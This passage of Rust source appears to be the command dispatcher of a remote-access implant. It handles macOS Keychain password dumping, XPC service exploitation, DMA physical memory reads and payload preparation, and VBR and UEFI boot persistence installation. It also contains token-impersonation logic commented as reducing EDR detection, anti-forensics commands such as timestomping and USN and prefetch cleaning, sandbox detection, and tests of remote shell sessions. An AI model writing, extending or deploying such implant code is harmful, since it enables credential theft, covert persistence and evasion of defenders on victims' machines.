                            .map_err(|e| format!("XPC exploitation failed: {e:#}")),
                        None => Err(format!("XPC service '{}' not found in enumerated services", service_name)),
                    }
                }
                Err(e) => Err(format!("XPC enumeration failed: {e:#}")),
            }
        }
        #[cfg(not(all(target_os = "macos", feature = "macos-postexp")))]
        Command::MacXpcExploit { .. } => {
            Err("macos-postexp feature not enabled (requires macOS target)".to_string())
        }

        // ── macOS Post-Exploitation: Keychain ─────────────────────────────
        #[cfg(all(target_os = "macos", feature = "macos-postexp"))]
        Command::MacKeychainDump => {
            crate::macos_postexp::dump_keychain()
                .map(|entries| {
                    let json_entries: Vec<serde_json::Value> = entries.iter().map(|e| {
                        serde_json::json!({
                            "service": e.service,
                            "account": e.account,
                            "password": e.password,
                            "entry_type": match e.entry_type {
                                crate::macos_postexp::KeychainEntryType::GenericPassword => "GenericPassword",
                                crate::macos_postexp::KeychainEntryType::InternetPassword => "InternetPassword",
                                crate::macos_postexp::KeychainEntryType::Certificate => "Certificate",
                                crate::macos_postexp::KeychainEntryType::Key => "Key",
                            },
                            "label": e.label,
                            "creation_date": e.creation_date,
                            "modification_date": e.modification_date,
                            "access_group": e.access_group,
                        })
                    }).collect();
                    serde_json::json!({ "entries": json_entries, "count": json_entries.len() }).to_string()
                })
                .map_err(|e| format!("Keychain dump failed: {e:#}"))
        }
        #[cfg(not(all(target_os = "macos", feature = "macos-postexp")))]
        Command::MacKeychainDump => {
            Err("macos-postexp feature not enabled (requires macOS target)".to_string())
        }

        // ── Hardware Persistence: Thunderbolt / DMA ───────────────────────
        #[cfg(feature = "hardware-persistence")]
        Command::HwDetectThunderbolt => {
            crate::hardware_persistence::detect_thunderbolt_controller()
                .map(|info| {
                    match info {
                        Some(ti) => serde_json::json!({
                            "generation": format!("{:?}", ti.generation),
                            "security_level": format!("{:?}", ti.security_level),
                            "port_count": ti.port_count,
                            "iommu_enabled": ti.iommu_enabled,
                            "kernel_dma_protection": ti.kernel_dma_protection,
                            "device_name": ti.device_name,
                            "vendor": ti.vendor,
                            "firmware_version": ti.firmware_version,
                            "nhi_path": ti.nhi_path,
                        }).to_string(),
                        None => serde_json::json!({ "detected": false }).to_string(),
                    }
                })
                .map_err(|e| format!("Thunderbolt detection failed: {e:#}"))
        }
        #[cfg(not(feature = "hardware-persistence"))]
        Command::HwDetectThunderbolt => {
            Err("hardware-persistence feature not enabled".to_string())
        }

        #[cfg(feature = "hardware-persistence")]
        Command::HwCheckDmaVulnerability => {
            crate::hardware_persistence::check_dma_vulnerability()
                .map(|vuln| {
                    serde_json::json!({
                        "vulnerable": vuln.vulnerable,
                        "risk_level": vuln.risk_level,
                        "summary": vuln.summary,
                    }).to_string()
                })
                .map_err(|e| format!("DMA vulnerability check failed: {e:#}"))
        }
        #[cfg(not(feature = "hardware-persistence"))]
        Command::HwCheckDmaVulnerability => {
            Err("hardware-persistence feature not enabled".to_string())
        }

        #[cfg(feature = "hardware-persistence")]
        Command::HwPrepareDmaPayload { payload_type } => {
            match parse_dma_payload_type(&payload_type) {
                Ok(pt) => crate::hardware_persistence::prepare_dma_payload(pt)
                    .map(|payload| {
                        use base64::Engine;
                        serde_json::json!({
                            "payload_data": base64::engine::general_purpose::STANDARD.encode(&payload.data),
                            "architecture": format!("{:?}", payload.architecture),
                            "payload_type": format!("{:?}", payload.payload_type),
                            "size_bytes": payload.data.len(),
                        }).to_string()
                    })
                    .map_err(|e| format!("DMA payload preparation failed: {e:#}")),
                Err(e) => Err(e),
            }
        }
        #[cfg(not(feature = "hardware-persistence"))]
        Command::HwPrepareDmaPayload { .. } => {
            Err("hardware-persistence feature not enabled".to_string())
        }

        #[cfg(feature = "hardware-persistence")]
        Command::HwDmaReadPhysical { addr, size } => {
            crate::hardware_persistence::dma_read_physical(addr, size as usize)
                .map(|data| {
                    use base64::Engine;
                    serde_json::json!({
                        "data": base64::engine::general_purpose::STANDARD.encode(&data),
                        "address": addr,
                        "size": data.len(),
                    }).to_string()
                })
                .map_err(|e| format!("DMA physical memory read failed: {e:#}"))
        }
        #[cfg(not(feature = "hardware-persistence"))]
        Command::HwDmaReadPhysical { .. } => {
            Err("hardware-persistence feature not enabled".to_string())
        }

        // ── Hardware Persistence: Boot ────────────────────────────────────
        #[cfg(feature = "hardware-persistence")]
        Command::HwBootMode => {
            crate::hardware_persistence::check_bios_uefi_mode()
                .map(|mode| {
                    serde_json::json!({
                        "mode": format!("{:?}", mode),
                    }).to_string()
                })
                .map_err(|e| format!("Boot mode check failed: {e:#}"))
        }
        #[cfg(not(feature = "hardware-persistence"))]
        Command::HwBootMode => {
            Err("hardware-persistence feature not enabled".to_string())
        }

        #[cfg(feature = "hardware-persistence")]
        Command::HwInstallVbrPersistence { payload_path } => {
            crate::hardware_persistence::install_vbr_persistence(&payload_path)
                .map(|_| "VBR persistence installed successfully".to_string())
                .map_err(|e| format!("VBR persistence installation failed: {e:#}"))
        }
        #[cfg(not(feature = "hardware-persistence"))]
        Command::HwInstallVbrPersistence { .. } => {
            Err("hardware-persistence feature not enabled".to_string())
        }

        #[cfg(feature = "hardware-persistence")]
        Command::HwInstallUefiBootPersistence { driver_path } => {
            crate::hardware_persistence::install_uefi_boot_persistence(&driver_path)
                .map(|_| "UEFI boot persistence installed successfully".to_string())
                .map_err(|e| format!("UEFI boot persistence installation failed: {e:#}"))
        }
        #[cfg(not(feature = "hardware-persistence"))]
        Command::HwInstallUefiBootPersistence { .. } => {
            Err("hardware-persistence feature not enabled".to_string())
        }

        #[cfg(feature = "hardware-persistence")]
        Command::HwDetectPersistence => {
            crate::hardware_persistence::detect_existing_persistence()
                .map(|artifacts| {
                    let json_artifacts: Vec<serde_json::Value> = artifacts.iter().map(|a| {
                        serde_json::json!({
                            "artifact_type": format!("{:?}", a.artifact_type),
                            "description": a.description,
                            "location": a.location,
                            "removable": a.removable,
                            "backup_path": a.backup_path,
                        })
                    }).collect();
                    serde_json::json!({ "artifacts": json_artifacts, "count": json_artifacts.len() }).to_string()
                })
                .map_err(|e| format!("Persistence detection failed: {e:#}"))
        }
        #[cfg(not(feature = "hardware-persistence"))]
        Command::HwDetectPersistence => {
            Err("hardware-persistence feature not enabled".to_string())
        }

        #[cfg(feature = "hardware-persistence")]
        Command::HwRemovePersistence {
            artifact_type,
            description,
            location,
            removable,
        } => {
            let artifact = crate::hardware_persistence::PersistenceArtifact {
                artifact_type: parse_persistence_artifact_type(&artifact_type),
                description,
                location,
                removable,
                backup_path: None,
            };
            crate::hardware_persistence::remove_persistence(&artifact)
                .map(|_| "Persistence artifact removed successfully".to_string())
                .map_err(|e| format!("Persistence removal failed: {e:#}"))
        }
        #[cfg(not(feature = "hardware-persistence"))]
        Command::HwRemovePersistence { .. } => {
            Err("hardware-persistence feature not enabled".to_string())
        }
    };

    // Auto-revert the impersonation token after task completion if
    // configured.  This limits the window where an impersonation token
    // is active on the main thread, reducing EDR detection surface.
    #[cfg(all(windows, feature = "token-impersonation"))]
    {
        // Skip auto-revert for RevertToken, ListTokens, and forensic
        // cleanup commands — these don't use impersonation tokens and
        // shouldn't disrupt a token set up for subsequent operations.
        match &command {
            Command::RevertToken
            | Command::ListTokens
            | Command::CleanPrefetch { .. }
            | Command::DisablePrefetch
            | Command::RestorePrefetch
            | Command::Timestomp { .. }
            | Command::TimestompDirectory { .. }
            | Command::CleanUsn { .. }
            | Command::SyncTimestamps => {}
            _ => crate::token_impersonation::auto_revert(),
        }
    }

    let (outcome, details) = match &result {
        Ok(_) => (Outcome::Success, sanitize_result(&command, &result)),
        Err(e) => (Outcome::Failure, e.clone()),
    };
    let audit = make_audit(&action, outcome, &details, operator_id);
    (result, result_data, audit)
}

fn handle_system_info() -> Result<String, String> {
    let mut sys = System::new_all();
    sys.refresh_all();
    let info = serde_json::json!({
        "os": System::name(),
        "hostname": System::host_name(),
        "cpu_count": sys.cpus().len(),
        "memory": { "total_bytes": sys.total_memory(), "used_bytes": sys.used_memory() },
        "process_count": sys.processes().len(),
    });
    Ok(info.to_string())
}

fn handle_run_approved_script(name: &str) -> Result<String, String> {
    match name {
        // ── Built-in approved scripts ───────────────────────────────────
        //
        // Each name maps to a deterministic, side-effect-bounded operation.
        // No arbitrary command execution — only pre-registered routines that
        // the operator can invoke by name via `Command::RunApprovedScript`.
        "health_check" => {
            // Basic liveness / readiness probe.  Returns a short JSON
            // payload with hostname and uptime so the operator can
            // distinguish multiple endpoints at a glance.
            let uptime = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs();
            let hostname = System::host_name().unwrap_or_else(|| "unknown".into());
            Ok(serde_json::json!({
                "status": "OK",
                "hostname": hostname,
                "unix_time": uptime,
            })
            .to_string())
        }

        "env_report" => {
            // Run the full VM / sandbox detection pipeline and return
            // the indicator report as JSON.  This is useful when the
            // operator wants to audit why an endpoint did (or did not)
            // trigger VM refusal without re-deploying.
            let report = crate::env_check::EnvReport::collect(None);
            Ok(serde_json::json!({
                "vm_detected": report.vm_detected,
                "vm_detected_strict": report.vm_detected_strict,
                "debugger_present": report.debugger_present,
                "sandbox_score": report.sandbox_score,
                "ld_preload_set": report.ld_preload_set,
                "tracer_process_found": report.tracer_process_found,
                "timing_anomaly_detected": report.timing_anomaly_detected,
                "yama_ptrace_scope": report.yama_ptrace_scope,
            })
            .to_string())
        }

        "list-modules" => {
            // Enumerate modules currently in the cache directory.
            let cfg = crate::config::load_config().map_err(|e| format!("config: {e}"))?;
            let cache_dir = std::path::Path::new(&cfg.module_cache_dir);
            if !cache_dir.exists() {
                return Ok("[]".to_string());
            }
            let mut entries: Vec<String> = Vec::new();
            let read_dir = std::fs::read_dir(cache_dir).map_err(|e| format!("read_dir: {e}"))?;
            for entry in read_dir.flatten() {
                if let Some(name) = entry.file_name().to_str() {
                    entries.push(name.to_owned());
                }
            }
            entries.sort();
            Ok(serde_json::json!({ "modules": entries }).to_string())
        }

        "purge-module-cache" => {
            // Remove all cached module blobs.  This forces subsequent
            // `DownloadModule` / `DeployModule` commands to re-fetch
            // from the repository or C2.
            let cfg = crate::config::load_config().map_err(|e| format!("config: {e}"))?;
            let cache_dir = std::path::Path::new(&cfg.module_cache_dir);
            if !cache_dir.exists() {
                return Ok("{\"purged\": 0}".to_string());
            }
            let mut purged: usize = 0;
            let read_dir = std::fs::read_dir(cache_dir).map_err(|e| format!("read_dir: {e}"))?;
            for entry in read_dir.flatten() {
                if entry.path().is_file() {
                    if std::fs::remove_file(entry.path()).is_ok() {
                        purged += 1;
                    }
                }
            }
            Ok(serde_json::json!({ "purged": purged }).to_string())
        }

        other => Err(format!("'{other}' is not an approved script")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn module_id_validation_accepts_safe_names() {
        assert!(is_valid_module_id("hello_plugin"));
        assert!(is_valid_module_id("net-scan-v2"));
        assert!(is_valid_module_id("ABC123"));
    }

    #[test]
    fn module_id_validation_rejects_traversal_and_path_chars() {
        assert!(!is_valid_module_id("../../etc/passwd"));
        assert!(!is_valid_module_id("foo/bar"));
        assert!(!is_valid_module_id("foo.bar"));
        assert!(!is_valid_module_id(""));
        assert!(!is_valid_module_id("foo bar"));
    }

    #[tokio::test]
    async fn deploy_module_rejects_traversal_id() {
        let cfg = Config::default();
        let crypto = Arc::new(CryptoSession::from_key([0u8; 32]));
        let cfg_arc = Arc::new(TokioMutex::new(cfg));
        let (out_tx, _out_rx) = tokio::sync::mpsc::channel(1);
        let p2p_mesh = Arc::new(tokio::sync::Mutex::new(crate::p2p::P2pMesh::default()));
        let (res, _, audit) = handle_command(
            crypto,
            cfg_arc,
            Command::DeployModule {
                module_id: "../../etc/passwd".into(),
            },
            "admin",
            out_tx,
            p2p_mesh,
        )
        .await;
        assert!(res.is_err(), "expected rejection, got {res:?}");
        assert!(matches!(audit.outcome, Outcome::Failure));
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn deploy_module_reads_from_configured_cache_dir() {
        // Stage a fake (and intentionally invalid as a real plugin) blob in
        // a writable cache dir, then verify the handler reaches the
        // module_loader stage rather than failing at path validation.
        let cache = tempfile::tempdir().unwrap();
        let blob_path = cache
            .path()
            .join(format!("test_mod.{}", std::env::consts::DLL_EXTENSION));
        std::fs::write(&blob_path, b"not-a-real-plugin").unwrap();

        let cfg = Config {
            allowed_paths: vec![cache.path().to_string_lossy().into_owned()],
            module_cache_dir: cache.path().to_string_lossy().into_owned(),
            ..Config::default()
        };
        let crypto = Arc::new(CryptoSession::from_key([0u8; 32]));
        let cfg_arc = Arc::new(TokioMutex::new(cfg));
        let (out_tx, _out_rx) = tokio::sync::mpsc::channel(1);
        let p2p_mesh = Arc::new(tokio::sync::Mutex::new(crate::p2p::P2pMesh::default()));

        let (res, _, _audit) = handle_command(
            crypto,
            cfg_arc,
            Command::DeployModule {
                module_id: "test_mod".into(),
            },
            "admin",
            out_tx,
            p2p_mesh,
        )
        .await;

        // Path validation must pass; the loader will reject the bogus blob.
        // What matters is that the failure is NOT a "Failed to read module
        // blob" / policy error.
        match res {
            Ok(_) => {} // unlikely with junk bytes, but acceptable
            Err(e) => {
                assert!(
                    !e.contains("Failed to read module blob"),
                    "validation should have allowed the read: {e}"
                );
                assert!(
                    !e.contains("Path is outside"),
                    "module_cache_dir should be allowed: {e}"
                );
            }
        }
    }

    // ── SECURITY_AUDIT.md §8 compliance tests ────────────────────────────────

    /// AuditEvent.details must NOT contain base64-encoded file contents for a
    /// successful ReadFile command.
    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn audit_event_does_not_contain_file_contents() {
        let dir = tempfile::tempdir().unwrap();
        let secret_file = dir.path().join("secret.txt");
        let secret = b"super-secret-password-data";
        std::fs::write(&secret_file, secret).unwrap();

        let cfg = Config {
            allowed_paths: vec![dir.path().to_string_lossy().into_owned()],
            ..Config::default()
        };
        let crypto = Arc::new(CryptoSession::from_key([0u8; 32]));
        let (out_tx, _out_rx) = tokio::sync::mpsc::channel(1);
        let p2p_mesh = Arc::new(tokio::sync::Mutex::new(crate::p2p::P2pMesh::default()));
        let (res, _result_data, audit) = handle_command(
            crypto,
            Arc::new(TokioMutex::new(cfg)),
            Command::ReadFile {
                path: secret_file.to_string_lossy().into_owned(),
            },
            "admin",
            out_tx,
            p2p_mesh,
        )
        .await;

        // The command must succeed.
        assert!(res.is_ok(), "ReadFile should succeed: {res:?}");

        // The audit details must NOT contain the file content (raw or base64).
        let b64_content = base64::engine::general_purpose::STANDARD.encode(secret);
        assert!(
            !audit.details.contains(&b64_content),
            "audit.details must not contain base64 file contents"
        );
        assert!(
            !audit.details.contains("super-secret"),
            "audit.details must not contain plaintext file contents"
        );
        // The redacted marker must be present.
        assert!(
            audit.details.contains("redacted"),
            "audit.details should contain redaction marker, got: {:?}",
            audit.details
        );
    }

    /// Interactive shell: create, send input, and close should all work.
    /// Shell output arrives asynchronously via Message::ShellOutput, so
    /// we verify the session lifecycle rather than polling for output.
    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn shell_session_lifecycle() {
        let crypto = Arc::new(CryptoSession::from_key([0u8; 32]));
        let cfg_arc = Arc::new(TokioMutex::new(Config::default()));
        let (out_tx, mut out_rx) = tokio::sync::mpsc::channel(64);
        let p2p_mesh = Arc::new(tokio::sync::Mutex::new(crate::p2p::P2pMesh::default()));

        // Create a shell session.
        let (create_res, _, audit) = handle_command(
            crypto.clone(),
            cfg_arc.clone(),
            Command::CreateShell { shell_path: None },
            "admin",
            out_tx.clone(),
            p2p_mesh.clone(),
        )
        .await;
        let create_str = create_res.expect("CreateShell should succeed");
        let info: serde_json::Value = serde_json::from_str(&create_str).unwrap();
        let session_id = info["session_id"].as_u64().unwrap() as u32;

        // Verify audit log does not contain sensitive data.
        assert!(
            !audit.details.contains("redacted") || audit.details.contains("session"),
            "CreateShell audit should reference the session"
        );

        // Send input.
        let (input_res, _, _) = handle_command(
            crypto.clone(),
            cfg_arc.clone(),
            Command::ShellInput {
                session_id,
                data: "echo hello\n".to_string(),
            },
            "admin",
            out_tx.clone(),
            p2p_mesh.clone(),
        )
        .await;
        assert!(
            input_res.is_ok(),
            "ShellInput should succeed: {:?}",
            input_res
        );

        // Give the reader thread time to capture output.
        tokio::time::sleep(std::time::Duration::from_millis(200)).await;

        // Drain any ShellOutput messages that arrived.
        while let Ok(msg) = out_rx.try_recv() {
            // Just verify they're the right type.
            match msg {
                Message::ShellOutput {
                    session_id: sid,
                    data,
                    ..
                } => {
                    assert_eq!(sid, session_id, "ShellOutput should reference our session");
                    let _ = data; // don't care about content for lifecycle test
                }
                _ => {}
            }
        }

        // List shells.
        let (list_res, _, _) = handle_command(
            crypto.clone(),
            cfg_arc.clone(),
            Command::ShellList,
            "admin",
            out_tx.clone(),
            p2p_mesh.clone(),
        )
        .await;
        let list_str = list_res.expect("ShellList should succeed");
        let list: Vec<serde_json::Value> = serde_json::from_str(&list_str).unwrap();
        assert!(
            list.iter()
                .any(|e| e["session_id"].as_u64().unwrap() as u32 == session_id),
            "ShellList should include our session"
        );

        // Close the shell.
        let (close_res, _, _) = handle_command(
            crypto,
            cfg_arc,
            Command::ShellClose { session_id },
            "admin",
            out_tx,
            p2p_mesh,
        )
        .await;
        assert!(
            close_res.is_ok(),
            "ShellClose should succeed: {:?}",
            close_res
        );
    }
}
